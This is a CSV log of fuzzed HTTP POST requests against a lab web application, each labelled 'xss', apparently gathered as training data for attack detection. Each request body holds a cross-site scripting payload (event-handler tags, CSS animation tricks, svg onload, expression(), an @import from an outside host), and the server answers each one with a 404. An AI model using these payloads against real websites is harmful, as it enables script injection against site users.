attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Content_Length,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Connection,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port
xss,192.168.60.165,80,"name=<rb onmouseenter=""alert(1)"">test</rb>",*/*,42,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:52 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57066
xss,192.168.60.165,80,"name=<rp onclick=""alert(1)"">test</rp>",*/*,37,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:52 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57080
xss,192.168.60.165,80,"name=<samp onmouseleave=""alert(1)"">test</samp>",*/*,46,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:52 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57088
xss,192.168.60.165,80,name=<section onblur=alert(1) tabindex=1 id=x></section><input autofocus>,*/*,73,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:52 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57092
xss,192.168.60.165,80,"name=<small onmousedown=""alert(1)"">test</small>",*/*,47,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:53 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57096
xss,192.168.60.165,80,"name=<span onkeydown=""alert(1)"" contenteditable>test</span>",*/*,59,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:53 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57108
xss,192.168.60.165,80,"name=<style>:target {color: red;}</style><button id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></button>",*/*,120,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:53 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57118
xss,192.168.60.165,80,"name=<style>:target {color: red;}</style><rb id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></rb>",*/*,112,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:53 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57122
xss,192.168.60.165,80,"name=<style>:target {color:red;}</style><fieldset id=x style=""transition:color 1s"" ontransitionend=alert(1)></fieldset>",*/*,119,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:53 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57132
xss,192.168.60.165,80,"name=<style>:target {color:red;}</style><samp id=x style=""transition:color 1s"" ontransitionend=alert(1)></samp>",*/*,111,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:53 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57148
xss,192.168.60.165,80,"name=<style>:target {transform: rotate(180deg);}</style><hr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></hr>",*/*,127,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:53 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57150
xss,192.168.60.165,80,"name=<style>@keyframes slidein {}</style><content style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></content>",*/*,173,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:54 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57156
xss,192.168.60.165,80,"name=<style>@keyframes slidein {}</style><summary style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></summary>",*/*,173,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:54 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57164
xss,192.168.60.165,80,"name=<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></tr>",*/*,179,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:54 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57166
xss,192.168.60.165,80,"name=<style>@keyframes x{}</style><dt style=""animation-name:x"" onanimationend=""alert(1)""></dt>",*/*,94,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:54 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57172
xss,192.168.60.165,80,"name=<style>@keyframes x{}</style><frame style=""animation-name:x"" onanimationstart=""alert(1)""></frame>",*/*,102,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:54 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57182
xss,192.168.60.165,80,"name=<sub draggable=""true"" ondragstart=""alert(1)"">test</sub>",*/*,60,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:54 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57184
xss,192.168.60.165,80,"name=<sup onmousedown=""alert(1)"">test</sup>",*/*,43,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:54 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57190
xss,192.168.60.165,80,"name=<svg onmouseenter=""alert(1)"">test</svg>",*/*,44,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:54 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57192
xss,192.168.60.165,80,"name=<table onbeforepaste=""alert(1)"" contenteditable>test</table>",*/*,65,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:55 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57208
xss,192.168.60.165,80,name=<textarea id=x tabindex=1 onactivate=alert(1)></textarea>,*/*,62,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:55 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57220
xss,192.168.60.165,80,"name=<textarea onkeyup=""alert(1)"" contenteditable>test</textarea>",*/*,65,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:55 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57228
xss,192.168.60.165,80,"name=<track oncontextmenu=""alert(1)"">test</track>",*/*,49,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:55 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57240
xss,192.168.60.165,80,"name=<tt onmouseup=""alert(1)"">test</tt>",*/*,39,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:55 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57248
xss,192.168.60.165,80,"name=<video autoplay controls onseeking=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",*/*,103,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:55 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57262
xss,192.168.60.165,80,"name=<xmp onkeydown=""alert(1)"" contenteditable>test</xmp>",*/*,57,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:55 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57268
xss,192.168.60.165,80,"name='';!--""<XSS>=&{()}",*/*,23,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:55 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57282
xss,192.168.60.165,80,name=<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,*/*,57,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:55 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57286
xss,192.168.60.165,80,"name=<!a foo=x=`y><img alt=""`><img src=xx:x onerror=alert(2)//"">",*/*,64,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:55 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57288
xss,192.168.60.165,80,"name=<circle r=""400""></circle>",*/*,30,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",close,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:56 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57290
xss,192.168.60.165,80,name=<marguee/onstart=alert(1)>,*/*,31,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:56 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57294
xss,192.168.60.165,80,name=<svg onload=(alert)(1)>,*/*,28,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:56 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57308
xss,192.168.60.165,80,"name=<div id=""138""><link rel=""import"" href=""test.svg"" />//[""'`-->]]>]</div><div id=""139""><iframe srcdoc=""&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;"" />//[""'`-->]]>]</div>undefined",*/*,197,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:56 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57316
xss,192.168.60.165,80,name=<div style=xss:expressio\006e(alert(1))>,*/*,45,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:56 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57324
xss,192.168.60.165,80,name=<div style=xss:expressio\6e(alert(1))>,*/*,43,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:56 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57334
xss,192.168.60.165,80,name=<div style=xss:expression(1)-alert(1)>,*/*,43,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:56 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57344
xss,192.168.60.165,80,"name=<script>$=1,alert($)</script>",*/*,34,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:56 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57358
xss,192.168.60.165,80,"name=*{color:red}</style>//[""'`-->]]>]</div>",*/*,44,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:56 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57370
xss,192.168.60.165,80,name=<eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(135)</eval>,*/*,81,application/x-www-form-urlencoded,192.168.60.165,Wfuzz/3.1.0,POST,http://192.168.60.165/DVM/vulnerabilities/xss_r/,"<!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0//EN""> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL was not found on this server.</p> <hr> <address>Apache/2.4.52 (Ubuntu) Server at 192.168.60.165 Port 80</address> </body></html> ",,276,text/html; charset=iso-8859-1,"Wed, 01 Mar 2023 10:36:56 GMT",404,Apache/2.4.52 (Ubuntu),192.168.60.157,57380
